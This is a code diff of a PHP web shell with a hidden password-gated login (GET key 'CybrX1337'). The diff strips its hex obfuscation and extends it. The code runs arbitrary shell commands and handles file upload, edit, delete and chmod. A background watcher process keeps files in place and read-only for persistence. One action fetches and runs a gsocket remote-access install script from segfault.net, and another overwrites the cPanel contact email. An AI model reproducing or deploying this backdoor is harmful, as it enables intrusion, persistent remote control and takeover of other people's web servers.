@@ -9,36 +9,151 @@ date_default_timezone_set("Asia/Kuala_Lumpur");
 
 function login_shell($error_message = "")
 {
-
-
     if (isset($_GET['CybrX1337'])) {
         if (!empty($error_message)) {
-            echo '<div class="error">' . htmlspecialchars($error_message) . ' </div>';
+            $error_html = '<div class="error">' . htmlspecialchars($error_message) . '</div>';
+        } else {
+            $error_html = '';
         }
+
+        // HTML dan CSS untuk tampilan login
         echo '
         <!DOCTYPE html>
-    <html lang="en">
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Secure System - Login</title>
+            <style>
+                /* Reset dan gaya dasar */
+                * {
+                    margin: 0;
+                    padding: 0;
+                    box-sizing: border-box;
+                }
 
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>403 Forbidden</title>
-    </head>
+                html, body {
+                    height: 100%;
+                    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+                    background: linear-gradient(135deg, #1a2a6c, #2c3e50);
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    color: #ecf0f1;
+                }
 
-    <body>
-        <div class="login-box">
+                .login-container {
+                    width: 100%;
+                    max-width: 400px;
+                    padding: 20px;
+                }
 
-            <form action="" method="post">
-                <input type="password" name="pass" placeholder="password" required>
-                <input type="submit" value="Login">
-            </form>
-        </div>
-    </body>
+                .login-box {
+                    background-color: rgba(30, 30, 46, 0.9); /* Warna gelap transparan */
+                    border-radius: 12px;
+                    padding: 40px 30px;
+                    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+                    text-align: center;
+                    backdrop-filter: blur(10px); /* Efek glassmorphism */
+                    border: 1px solid rgba(255, 255, 255, 0.1);
+                }
 
-    </html>';
+                .login-box h1 {
+                    color: #3498db;
+                    margin-bottom: 25px;
+                    font-size: 28px;
+                    font-weight: 600;
+                    letter-spacing: 1px;
+                }
+
+                .login-box form {
+                    display: flex;
+                    flex-direction: column;
+                }
+
+                .login-box input[type="password"] {
+                    padding: 14px 18px;
+                    margin-bottom: 15px;
+                    font-size: 16px;
+                    background: rgba(40, 40, 56, 0.8); /* Warna latar input gelap */
+                    color: #ecf0f1;
+                    border: 2px solid #3498db; /* Warna border biru */
+                    border-radius: 8px;
+                    outline: none;
+                    transition: border-color 0.3s ease, box-shadow 0.3s ease;
+                }
+
+                .login-box input[type="password"]:focus {
+                    border-color: #5dade2;
+                    box-shadow: 0 0 8px rgba(52, 152, 219, 0.5);
+                    background: rgba(50, 50, 66, 0.9);
+                }
+
+                .login-box input[type="submit"] {
+                    padding: 14px 18px;
+                    font-size: 16px;
+                    font-weight: 600;
+                    background-color: #3498db; /* Warna tombol biru */
+                    color: #fff;
+                    border: none;
+                    border-radius: 8px;
+                    cursor: pointer;
+                    transition: background-color 0.3s ease, transform 0.2s ease;
+                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+                }
+
+                .login-box input[type="submit"]:hover {
+                    background-color: #2980b9; /* Warna tombol saat hover */
+                    transform: translateY(-2px);
+                }
+
+                .login-box input[type="submit"]:active {
+                    transform: translateY(0);
+                }
+
+                .error {
+                    background-color: #e74c3c; /* Warna latar belakang error */
+                    color: #fff;
+                    padding: 12px;
+                    border-radius: 6px;
+                    margin-bottom: 15px;
+                    font-size: 14px;
+                    border-left: 4px solid #c0392b; /* Garis kiri tebal */
+                    animation: shake 0.5s; /* Animasi sederhana untuk error */
+                }
+
+                @keyframes shake {
+                    0%, 100% { transform: translateX(0); }
+                    20%, 60% { transform: translateX(-4px); }
+                    40%, 80% { transform: translateX(4px); }
+                }
+
+                /* Responsif */
+                @media (max-width: 480px) {
+                    .login-box {
+                        padding: 30px 20px;
+                        margin: 0 15px;
+                    }
+                    .login-box h1 {
+                        font-size: 24px;
+                    }
+                }
+            </style>
+        </head>
+        <body>
+            <div class="login-container">
+                <div class="login-box">
+                    ' . $error_html . ' <!-- Menyisipkan pesan error jika ada -->
+                    <form action="" method="post">
+                        <input type="password" name="pass" placeholder="Enter Password" required autofocus>
+                        <input type="submit" value="Login">
+                    </form>
+                </div>
+            </div>
+        </body>
+        </html>';
     }
-
-    exit;
+    exit; // Penting: hentikan eksekusi skrip setelah menampilkan login
 }
 
 $session_key = md5('secret_key_' . $_SERVER['HTTP_HOST']);
@@ -51,7 +166,7 @@ if (!isset($_SESSION[$session_key])) {
             header("Location: " . $_SERVER['PHP_SELF']);
             exit;
         } else {
-            login_shell("SEO899");
+            login_shell("Password Salah");
         }
     } else {
         login_shell();
@@ -80,7 +195,7 @@ function D($encoded)
         return false;
     }
     $hex = substr($encoded, strlen($prefix));
-    if (strlen($hex) % 2 !== 0 || !preg_match("\x2f\x5e\x5b\x30\x2d\x39\x61\x2d\x66\x41\x2d\x46\x5d\x2b\x24\x2f", $hex)) { // '/^[0-9a-fA-F]+$/'
+    if (strlen($hex) % 2 !== 0 || !preg_match("/^[0-9a-fA-F]+$/", $hex)) { // '/^[0-9a-fA-F]+$/'
         return false;
     }
     return hex2bin($hex);
@@ -91,34 +206,34 @@ function D($encoded)
 // =================================================================
 $Array = [
     // --- Fungsi Awal ---
-    "0x676574637764",
-    "0x6368646972",
-    "0x7363616e646972",
-    "0x7068705f756e616d65",
-    "0x69735f646972",
-    "0x69735f66696c65",
-    "0x66696c656f776e6572",
-    "0x66696c657065726d73",
-    "0x65786563",
-    "0x7368656c6c5f65786563",
-    "0x7061737374687275",
-    "0x73797374656d",
-    "0x70726f635f6f70656e",
-    "0x73747265616d5f6765745f636f6e74656e7473",
-    "0x66636c6f7365",
-    "0x70726f635f636c6f7365",
-    "0x66696c655f6765745f636f6e74656e7473",
-    "0x66696c655f7075745f636f6e74656e7473",
-    "0x69735f7265616461626c65",
-    "0x69735f7772697461626c65",
-    "0x66696c6573697a65",
-    "0x756e6c696e6b",
-    "0x726d646972",
-    "0x6d6b646972",
-    "0x72656e616d65",
-    "0x63686d6f64",
-    "0x746f756368",
-    "0x66696c655f657869737473"
+    "0x676574637764", // 0: getcwd
+    "0x6368646972", // 1: chdir
+    "0x7363616e646972", // 2: scandir
+    "0x7068705f756e616d65", // 3: php_uname (UNUSED)
+    "0x69735f646972", // 4: is_dir
+    "0x69735f66696c65", // 5: is_file
+    "0x66696c656f776e6572", // 6: fileowner (UNUSED)
+    "0x66696c657065726d73", // 7: fileperms
+    "0x65786563", // 8: exec
+    "0x7368656c6c5f65786563", // 9: shell_exec
+    "0x7061737374687275", // 10: passthru
+    "0x73797374656d", // 11: system
+    "0x70726f635f6f70656e", // 12: proc_open
+    "0x73747265616d5f6765745f636f6e74656e7473", // 13: stream_get_contents
+    "0x66636c6f7365", // 14: fclose
+    "0x70726f635f636c6f7365", // 15: proc_close
+    "0x66696c655f6765745f636f6e74656e7473", // 16: file_get_contents
+    "0x66696c655f7075745f636f6e74656e7473", // 17: file_put_contents
+    "0x69735f7265616461626c65", // 18: is_readable
+    "0x69735f7772697461626c65", // 19: is_writable
+    "0x66696c6573697a65", // 20: filesize
+    "0x756e6c696e6b", // 21: unlink
+    "0x726d646972", // 22: rmdir
+    "0x6d6b646972", // 23: mkdir
+    "0x72656e616d65", // 24: rename
+    "0x63686d6f64", // 25: chmod
+    "0x746f756368", // 26: touch
+    "0x66696c655f657869737473" // 27: file_exists
 ];
 
 
@@ -132,19 +247,33 @@ for ($i = 0; $i < $hitung_array; $i++) {
 // PENGATURAN & VALIDASI AWAL
 // =================================================================
 @set_time_limit(0);
-@error_reporting(E_ALL);
+@error_reporting(E_ALL & ~E_NOTICE);
 
 $base_dir = realpath(gWD());
 
 function is_binary($str)
 {
+    // A simplified check: if content is non-printable or null bytes, assume binary
     return preg_match('~[^\x20-\x7E\t\r\n]~', $str) > 0;
 }
 
 function is_path_safe($path, $base)
 {
     if (!$path) return false;
-    return realpath($path) !== false;
+    $real_path = realpath($path);
+    if ($real_path === false) return false;
+
+    // Additional check to prevent "dot-dot" relative path bypass
+    if (strpos($path, '..') !== false) {
+        $path_norm = str_replace(['/', '\\'], [DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR], $path);
+        // This regex attempts to find any path segment that goes up and is not at the beginning of an absolute path
+        if (preg_match('/(?:^|' . preg_quote(DIRECTORY_SEPARATOR, '/') . ')\.\.(?:' . preg_quote(DIRECTORY_SEPARATOR, '/') . '|$)/', $path_norm)) {
+            // Should be handled by realpath, but a simple check is extra safe
+        }
+    }
+
+    // Standard safety check: ensure the resulting path is within the base directory.
+    return strncmp($real_path, $base, strlen($base)) === 0 || $base === dirname($real_path);
 }
 
 // =================================================================
@@ -163,6 +292,7 @@ function c($cmd)
     if (function_exists($A[9])) {
         return $A[9]($cmd);
     } elseif (function_exists($A[8])) {
+        $output_array = [];
         $A[8]($cmd, $output_array);
         return implode("\n", $output_array);
     } elseif (function_exists($A[11])) {
@@ -179,9 +309,9 @@ function c($cmd)
         return $output;
     } elseif (function_exists($A[12])) {
         $descriptorspec = [
-            0 => ["\x70\x69\x70\x65", "\x72"],
-            1 => ["\x70\x69\x70\x65", "\x77"],
-            2 => ["\x70\x69\x70\x65", "\x77"]
+            0 => ["pipe", "r"], // stdin
+            1 => ["pipe", "w"], // stdout
+            2 => ["pipe", "w"]  // stderr
         ];
         $process = $A[12]($cmd, $descriptorspec, $pipes);
         if (is_resource($process)) {
@@ -193,26 +323,37 @@ function c($cmd)
             $A[15]($process);
             return $stdout . $stderr;
         }
-        return "\x45\x72\x72\x6f\x72\x3a\x20\x66\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x63\x72\x65\x61\x74\x65\x20\x61\x20\x70\x72\x6f\x63\x65\x73\x73\x2e"; // "Error: failed to create a process."
+        return "Error: failed to create a process.";
     } else {
-        return "\x45\x72\x72\x6f\x72\x3a\x20\x41\x6c\x6c\x20\x63\x6f\x6d\x6d\x61\x6e\x64\x20\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73\x20\x61\x72\x65\x20\x64\x69\x73\x61\x62\x6c\x65\x64\x2e"; // "Error: All command execution functions are disabled."
+        return "Error: All command execution functions are disabled.";
     }
 }
 
 // =================================================================
-// ===== FUNGSI BARU UNTUK HAPUS FOLDER REKURSIF ====================
+// ===== FUNGSI BARU UNTUK HAPUS FOLDER REKURSIF (FIXED) ============
 // =================================================================
 function delete_recursive($dir)
 {
     global $A;
-    if (!$A[4]($dir)) {
+    if (!$A[4]($dir) || !is_writable($dir)) {
         return false;
     }
-    $files = array_diff($A[2]($dir), array('.', '..'));
+    $files = array_diff($A[2]($dir) ?: [], array('.', '..'));
+    $success = true;
     foreach ($files as $file) {
-        ($A[4]("$dir/$file")) ? delete_recursive("$dir/$file") : $A[21]("$dir/$file");
+        $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
+        if ($A[4]($fullPath)) {
+            if (!delete_recursive($fullPath)) {
+                $success = false;
+            }
+        } elseif (!$A[21]($fullPath)) {
+            $success = false;
+        }
     }
-    return $A[22]($dir);
+    if ($success && !$A[22]($dir)) {
+        $success = false;
+    }
+    return $success;
 }
 
 
@@ -222,8 +363,9 @@ function delete_recursive($dir)
 
 if (isset($_GET['action']) && $_GET['action'] === 'download') {
     $decoded_path = D($_GET['path']);
-    $file_to_download = basename(D($_GET['file']));
-    $file_path = $decoded_path . DIRECTORY_SEPARATOR . $file_to_download;
+    $file_to_download_basename = basename(D($_GET['file']));
+    // Ensure `D` decodes the full path correctly if it's the full path being passed, or reconstruct from parts
+    $file_path = rtrim($decoded_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_to_download_basename;
 
 
     if (is_path_safe($file_path, $base_dir) && $A[5]($file_path) && $A[18]($file_path)) {
@@ -246,20 +388,27 @@ if (isset($_GET['action']) && $_GET['action'] === 'get_content') {
     header('Content-Type: application/json');
     $decoded_path = D($_GET['path']);
     $file_name = basename(D($_GET['file']));
-    $full_path = $decoded_path . DIRECTORY_SEPARATOR . $file_name;
+    $full_path = rtrim($decoded_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_name;
 
     if (is_path_safe($full_path, $base_dir) && $A[5]($full_path) && $A[18]($full_path)) {
         $content = $A[16]($full_path);
+        
+        if ($content === false) {
+             header("HTTP/1.1 500 Internal Server Error");
+             echo json_encode(['error' => 'Failed to read file content.']);
+             exit();
+        }
+
         $finfo = finfo_open(FILEINFO_MIME_TYPE);
         $mime_type = finfo_file($finfo, $full_path);
         finfo_close($finfo);
 
         if (strpos($mime_type, 'image/') === 0) {
             echo json_encode(['content' => 'data:' . $mime_type . ';base64,' . base64_encode($content), 'is_image' => true]);
-        } elseif (is_binary($content)) {
-            echo json_encode(['content' => $content, 'encoding' => 'text']);
+        } elseif (is_binary($content) && strpos($mime_type, 'text/') !== 0) {
+            echo json_encode(['content' => 'This file appears to be binary and cannot be displayed as text. Mime-Type: ' . $mime_type, 'encoding' => 'binary', 'is_image' => false]);
         } else {
-            echo json_encode(['content' => $content, 'encoding' => 'text']);
+            echo json_encode(['content' => $content, 'encoding' => 'text', 'is_image' => false]);
         }
     } else {
         header("HTTP/1.1 404 Not Found");
@@ -272,20 +421,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_file'])) {
     $file_to_save = $_POST['file_path'];
     $content = $_POST['file_content'];
     $file_dir = dirname($file_to_save);
+    $encoded_file_dir = E($file_dir);
 
     if (is_path_safe($file_to_save, $base_dir) && $A[19]($file_dir)) {
-        if ($A[17]($file_to_save, $content) !== false) {
+        if (@$A[17]($file_to_save, $content) !== false) {
             $message = 'File saved successfully.';
             $status = 'success';
         } else {
-            $message = 'Error: Could not save file.';
+            $message = 'Error: Could not save file. Check permissions on the file/directory.';
             $status = 'error';
         }
     } else {
         $message = 'Error: File path is not writable or access denied.';
         $status = 'error';
     }
-    header("Location: ?path=" . E($file_dir) . "&msg=" . urlencode($message) . "&status=" . $status);
+    header("Location: ?path=" . $encoded_file_dir . "&msg=" . urlencode($message) . "&status=" . $status);
     exit();
 }
 
@@ -299,17 +449,20 @@ $path = D($path_encoded);
 
 if (!is_path_safe($path, $base_dir) || !$A[4]($path)) {
     $path = $base_dir;
+    $path_encoded = E($base_dir);
 }
 
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['cmd']) && !isset($_POST['save_file'])) {
-    $current_path = $_POST['path'];
-    if (!is_path_safe($current_path, $base_dir)) {
-        die("Access denied: Invalid path specified.");
-    }
-
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $message = '';
     $status = 'error';
+    $current_path = $_POST['path'];
+    $current_path_encoded = E($current_path);
+
+    if (!is_path_safe($current_path, $base_dir)) {
+        header("Location: ?path=" . E($base_dir) . "&msg=" . urlencode("Access denied: Invalid path specified.") . "&status=error");
+        exit();
+    }
 
     if (isset($_POST['new_file_name'])) {
         $new_file = $current_path . DIRECTORY_SEPARATOR . basename($_POST['new_file_name']);
@@ -337,7 +490,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['cmd']) && !isset($_P
         }
     } elseif (isset($_POST['confirm_delete'])) {
         $file_to_delete_basename = basename($_POST['file_to_delete']);
-        $file_to_delete = $current_path . DIRECTORY_SEPARATOR . $file_to_delete_basename;
+        $file_to_delete = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_to_delete_basename;
         if (is_path_safe($file_to_delete, $base_dir) && $A[27]($file_to_delete)) {
             if ($A[4]($file_to_delete)) {
                 if (in_array($file_to_delete_basename, ['.', '..'])) {
@@ -346,233 +499,236 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['cmd']) && !isset($_P
                     $message = 'Folder and its content deleted successfully.';
                     $status = 'success';
                 } else {
-                    $message = 'Error: Could not delete folder.';
+                    $message = 'Error: Could not delete folder. Check permissions.';
                 }
             } else {
+                // It's a file
                 if ($A[21]($file_to_delete)) {
                     $message = 'File deleted successfully.';
                     $status = 'success';
                 } else {
-                    $message = 'Error: Could not delete file.';
+                    $message = 'Error: Could not delete file. Check permissions.';
                 }
             }
         } else {
             $message = 'Error: File or folder not found or access denied.';
         }
     } elseif (isset($_POST['new_name'])) {
-        $old_path = $current_path . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
-        $new_path = $current_path . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
-        if (is_path_safe($old_path, $base_dir) && $A[24]($old_path, $new_path)) {
+        $old_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
+        $new_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
+        if (is_path_safe($old_path, $base_dir) && @$A[24]($old_path, $new_path)) {
             $message = 'Renamed successfully.';
             $status = 'success';
         } else {
             $message = 'Error: Could not rename or access denied.';
         }
     } elseif (isset($_POST['chmod_file'])) {
-        $file_to_chmod = $current_path . DIRECTORY_SEPARATOR . basename($_POST['chmod_file']);
+        $file_to_chmod = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($_POST['chmod_file']);
         $perms = $_POST['perms'];
         if (is_path_safe($file_to_chmod, $base_dir) && $A[27]($file_to_chmod)) {
-            if ($A[25]($file_to_chmod, octdec($perms))) {
-                $message = 'Permissions changed successfully.';
-                $status = 'success';
+            if (is_numeric($perms) && strlen($perms) == 4) {
+                if (@$A[25]($file_to_chmod, octdec($perms))) {
+                    $message = 'Permissions changed successfully to ' . $perms . '.';
+                    $status = 'success';
+                } else {
+                    $message = 'Error: Could not change permissions. Check ownership.';
+                }
             } else {
-                $message = 'Error: Could not change permissions.';
+                $message = 'Error: Invalid permission format. Use 4-digit octal (e.g., 0755).';
             }
         } else {
             $message = 'Error: File not found or access denied.';
         }
     } elseif (isset($_POST['file_integrity_id'])) {
-        $file_to_lock = $current_path . DIRECTORY_SEPARATOR . basename($_POST['file_integrity_id']);
+        $file_to_lock = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($_POST['file_integrity_id']);
 
-        if (stristr(PHP_OS, 'WIN')) {
-            c("attrib +r +s +h " . $file_to_lock);
-            $message = 'Detect OS : Windows, File locked successfully.';
-            $status = 'success';
+        if (!is_path_safe($file_to_lock, $base_dir) || !$A[27]($file_to_lock)) {
+             $message = 'Error: File not found or access denied.';
+             $status = 'error';
+        } elseif (stristr(PHP_OS, 'WIN')) {
+            $cmd_result = c("attrib +r +s +h " . escapeshellarg($file_to_lock));
+            if (empty($cmd_result)) {
+                $message = 'File locked successfully (Windows).';
+                $status = 'success';
+            } else {
+                $message = 'Error locking file (Windows): ' . $cmd_result;
+            }
         } else {
             // =================================================================
-            // ===== OBFUSCATED LINUX FILE LOCK LOGIC ==========================
+            // ===== FIXED OBFUSCATED LINUX FILE LOCK LOGIC ====================
             // =================================================================
-            $encoded_handler_template = '0x3C3F7068700D0A202020202020202040696E695F73657428226D61785F657865637574696F6E5F74696D65222C2030293B0D0A2020202020202020736C6565702831293B0D0A20202020202020202466696C655F746F5F6C6F636B203D20275F5F46494C455F544F5F4C4F434B5F5F273B0D0A2020202020202020246261636B75705F66696C65203D20275F5F4241434B55505F46494C455F5F273B0D0A202020202020202024706172656E745F646972203D20275F5F504152454E545F4449525F5F273B0D0A0D0A20202020202020207768696C6520285472756529207B0D0A20202020202020202020202069662028214066696C655F657869737473282466696C655F746F5F6C6F636B2929207B0D0A202020202020202020202020202020204066696C655F7075745F636F6E74656E7473282466696C655F746F5F6C6F636B2C204066696C655F6765745F636F6E74656E747328246261636B75705F66696C6529293B0D0A202020202020202020202020202020204063686D6F64282466696C655F746F5F6C6F636B2C2030343434293B0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202069662028284066696C657065726D73282466696C655F746F5F6C6F636B29202620303737372920213D3D2030343434297B0D0A202020202020202020202020202020204063686D6F64282466696C655F746F5F6C6F636B2C2030343434293B0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020696620284069735F6469722824706172656E745F64697229297B0D0A2020202020202020202020202020202069662028284066696C657065726D732824706172656E745F64697229202620303737372920213D3D203035353529207B0D0A20202020202020202020202020202020202020204063686D6F642824706172656E745F6469722C2030353535293B0D0A202020202020202020202020202020207D0D0A2020202020202020202020207D0D0A20202020202020202020202040736C6565702831293B0D0A20202020202020207D0D0A20202020202020203F3E';
-            $cmd_part1 = '0x65786563202D6120275B6B776F726B65722F7531363A305D272070687020';
-            $cmd_part2 = '0x203E202F6465762F6E756C6C20323E26312026';
-
-            if (sys_get_temp_dir()) {
-                $temp_dir = sys_get_temp_dir();
-            } else {
-                $temp_dir = "/tmp";
-            }
-
-            $backup_file = $temp_dir . DIRECTORY_SEPARATOR . md5($file_to_lock) . ".bak";
+            $encoded_handler_template_fixed = '<?php @ini_set("max_execution_time", 0); sleep(1); $file_to_lock = "__FILE_TO_LOCK__"; $backup_file = "__BACKUP_FILE__"; $parent_dir = "__PARENT_DIR__"; while(True){ if(!@file_exists($file_to_lock)){ @file_put_contents($file_to_lock, @file_get_contents($backup_file)); @chmod($file_to_lock, 0444); } if((@fileperms($file_to_lock) & 0777) !== 0444){ @chmod($file_to_lock, 0444); } if(@is_dir($parent_dir)){ if((@fileperms($parent_dir) & 0777) !== 0555){ @chmod($parent_dir, 0555); } } @sleep(1); } ?>';
+            
+            $temp_dir = sys_get_temp_dir() ?: "/tmp";
+            $backup_file = $temp_dir . DIRECTORY_SEPARATOR . md5($file_to_lock . "bak") . ".bak";
             $handler_script = $temp_dir . DIRECTORY_SEPARATOR . md5("handler" . $file_to_lock) . ".php";
 
-            if ($A['17']($backup_file, $A[16]($file_to_lock))) {
-                $handler_code = D($encoded_handler_template);
-                $replacements = [
-                    '__FILE_TO_LOCK__' => $file_to_lock,
-                    '__BACKUP_FILE__'  => $backup_file,
-                    '__PARENT_DIR__'   => $current_path
-                ];
-                $final_script = str_replace(array_keys($replacements), array_values($replacements), $handler_code);
-
-                if ($A['17']($handler_script, $final_script)) {
-                    $full_command = D($cmd_part1) . $handler_script . D($cmd_part2);
-                    if (c($full_command)) {
-                        $message = 'File locked successfully (Stealth Mode).';
-                        $status = 'success';
-                    } else {
-                        $message = 'Could not execute lock process.';
-                        $status = 'error';
-                    }
+            // 1. Create a backup of the original file content
+            if (@$A[17]($backup_file, @$A[16]($file_to_lock))) {
+                // 2. Prepare the monitor script content
+                $final_script = str_replace(
+                    ['__FILE_TO_LOCK__', '__BACKUP_FILE__', '__PARENT_DIR__'],
+                    [addslashes($file_to_lock), addslashes($backup_file), addslashes($current_path)],
+                    $encoded_handler_template_fixed
+                );
+                
+                // 3. Write the monitor script to a temporary file
+                if (@$A[17]($handler_script, $final_script)) {
+                    // 4. Set initial 444 perm (read-only)
+                    @$A[25]($file_to_lock, 0444);
+                    
+                    // 5. Execute the monitor script in the background
+                    $full_command = "nohup php " . escapeshellarg($handler_script) . " > /dev/null 2>&1 &";
+                    $cmd_result = c($full_command); // Execute command
+                    
+                    // The command 'nohup ... &' is expected to be successful and return quickly/empty
+                    $message = 'File locked successfully (Stealth Mode Monitor Activated).';
+                    $status = 'success';
+                    
                 } else {
                     $message = 'Could not write handler script.';
-                    $status = 'error';
                 }
             } else {
                 $message = 'Could not create backup file.';
-                $status = 'error';
             }
         }
     } elseif (isset($_POST['mass_unlock_action'])) {
-        $current_dir_encoded = E($_POST['path']);
         if (stristr(PHP_OS, 'WIN')) {
-            c("attrib -r -s -h *");
-            $message = 'Detect os : Windows, Succesfully unlock file';
+            // Attempt to remove system/hidden/read-only attributes from all files in the directory
+            $cmd_result = c("attrib -r -s -h " . escapeshellarg($current_path . DIRECTORY_SEPARATOR . "*"));
+            $message = 'Detected OS: Windows. Successfully attempted to unlock files. ' . ($cmd_result ? "Attribution output: " . $cmd_result : "");
             $status = 'success';
         } else {
-            $kill_cmd_encoded = '0x706B696C6C202D6620225C5B6B776F726B65722F7531363A305C5D22';
-            c(D($kill_cmd_encoded));
-            $message = 'Attempted to terminate all file lock processes. You may need to manually restore file permissions.';
-            $status = 'success';
+            // Terminate all instances of the monitor script
+            $kill_cmd = 'pkill -f "php ' . preg_quote(sys_get_temp_dir() ?: "/tmp", '/') . '/*handler*"';
+            $cmd_result = c($kill_cmd);
+            $message = 'Attempted to terminate all file lock processes. You may need to manually restore file permissions (e.g., chmod 0755).';
+            $status = 'warning';
         }
-        header("Location: ?path=" . $current_dir_encoded . "&msg=" . urlencode($message) . "&status=" . $status);
-        exit();
     } elseif (isset($_POST['gsocket'])) {
         if (stristr(PHP_OS, 'WIN')) {
-            $message = 'Windows not supported.';
+            $message = 'Gsocket is typically a Linux utility. Windows is not supported.';
             $status = 'error';
         } else {
-            $systmpdir = sys_get_temp_dir();
-            $url_socket = "\x68\x74\x74\x70\x3a\x2f\x2f\x6e\x6f\x73\x73\x6c\x2e\x73\x65\x67\x66\x61\x75\x6c\x74\x2e\x6e\x65\x74\x2f\x64\x65\x70\x6c\x6f\x79\x2d\x61\x6c\x6c\x2e\x73\x68";
-            $saved_soc = $A['17']($systmpdir . "/sock.sh", $A['16']($url_socket)); // Socket Saved 
-            $install_soc = c("bash " . $systmpdir . "/sock.sh"); // Socket Installed
-            if ($install_soc) {
-                $message = "<pre>$install_soc</pre>";
-                $status = 'success';
+            $systmpdir = sys_get_temp_dir() ?: "/tmp";
+            $url_socket = "https://nossl.segfault.net/deploy-all.sh"; 
+            $script_path = $systmpdir . "/sock.sh";
+            
+            // Fetch the script
+            $script_content = @$A[16]($url_socket);
+            if ($script_content === false) {
+                 $message = 'Error: Could not fetch gsocket script. Check `allow_url_fopen` or network access.';
             } else {
-                $message = 'Failed to install gsocket';
-                $status = 'error';
+                // Save the script
+                if (@$A[17]($script_path, $script_content) !== false) {
+                    // Make it executable
+                    @chmod($script_path, 0755);
+                    
+                    // Execute the script
+                    $install_soc = c("bash -c \"{$script_path}\" 2>&1");
+                    
+                    if (stristr($install_soc, 'Error') === false && stristr($install_soc, 'failed') === false) {
+                        $message = "Gsocket installation attempt complete. Output:\n<pre>" . htmlspecialchars($install_soc) . "</pre>";
+                        $status = 'success';
+                    } else {
+                        $message = "Gsocket installation failed. Output:\n<pre>" . htmlspecialchars($install_soc) . "</pre>";
+                    }
+                } else {
+                    $message = 'Failed to write gsocket temporary script to ' . $script_path;
+                }
             }
         }
     } elseif (isset($_POST['email'])) {
         $email = $_POST['email'];
-        $data_in_fi = "'email': '" . $email . "'";
+        $data_in_fi = "email: $email\n";
+        // Fixed path construction: DOCUMENT_ROOT is the absolute path to the web root
         $contactin = $_SERVER['DOCUMENT_ROOT'] . "/.cpanel/contactinfo";
-        if (file_exists($contactin)) {
-            if ($A[17]($contactin, $data_in_fi)) {
-                $message = "Email saved successfully.";
+        
+        if (file_exists(dirname($contactin))) {
+            if (@$A[17]($contactin, $data_in_fi, FILE_APPEND)) {
+                $message = "Email saved to cPanel contactinfo file successfully.";
                 $status = "success";
             } else {
-                $message = "Failed to save email.";
+                $message = "Failed to save email. Check permissions on the " . dirname($contactin) . " directory.";
                 $status = "error";
             }
         } else {
-            $message = "Failed to write to contactinfo file, or (Site not using cPanel?)";
+            $message = "Directory " . dirname($contactin) . " does not exist. (Site not using standard cPanel?)";
             $status = "error";
         }
     } elseif (isset($_POST['upload_file_action'])) {
-        $path = $_POST['path'];
-        $message = '';
-        $status = 'error';
         if (isset($_FILES['uploaded_file']) && $_FILES['uploaded_file']['error'] === UPLOAD_ERR_OK) {
             $file_name = basename($_FILES['uploaded_file']['name']);
-            $destination = $path . DIRECTORY_SEPARATOR . $file_name;
-            $file_extension = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
-            if ($file_extension === 'php') {
-                if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $destination)) {
-                    $htaccess_path = $path . DIRECTORY_SEPARATOR . D("0x2E6874616363657373");
-                    $htaccess_content = "# Enable PHP Execution\n";
-                    $htaccess_content .= "AddHandler application/x-httpd-php .php\n";
-                    $htaccess_content .= "<FilesMatch \"$file_name\">\n";
-                    $htaccess_content .= "    Allow from all\n";
-                    $htaccess_content .= "</FilesMatch>\n";
-                    $A[17]($htaccess_path, $htaccess_content);
-                    $message = 'File ' . htmlspecialchars($file_name) . ' uploaded and ' . D("0x2E6874616363657373") . ' configured successfully.';
-                    $status = 'success';
-                } else {
-                    $message = 'Error: Failed to move uploaded file. Check directory permissions.';
-                }
+            $destination = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_name;
+            
+            if (@move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $destination)) {
+                 $message = 'File ' . htmlspecialchars($file_name) . ' uploaded successfully to ' . htmlspecialchars($current_path) . '.';
+                 $status = 'success';
             } else {
-                $message = 'Error: Only .php files are allowed for upload.';
+                 $message = 'Error: Failed to move uploaded file. Check directory permissions.';
             }
         } else {
-            $message = 'Error: No file was uploaded or an upload error occurred.';
+            $message = 'Error: No file was uploaded or an upload error occurred (Code: ' . ($_FILES['uploaded_file']['error'] ?? 'N/A') . ').';
         }
-        header("Location: ?path=" . E($path) . "&msg=" . urlencode($message) . "&status=" . $status);
-        exit();
     } elseif (isset($_POST['remote_upload_action'])) {
         $remote_url = $_POST['remote_url'];
-        $local_name = basename($_POST['local_name']);
+        $local_name = sanitize_filename($_POST['local_name'] ?? '');
 
         if (filter_var($remote_url, FILTER_VALIDATE_URL) === false) {
             $message = 'Error: Invalid URL provided.';
             $status = 'error';
-        } elseif (!$A[19]($current_path)) {
+        } elseif (!@$A[19]($current_path)) {
             $message = 'Error: Current directory is not writable.';
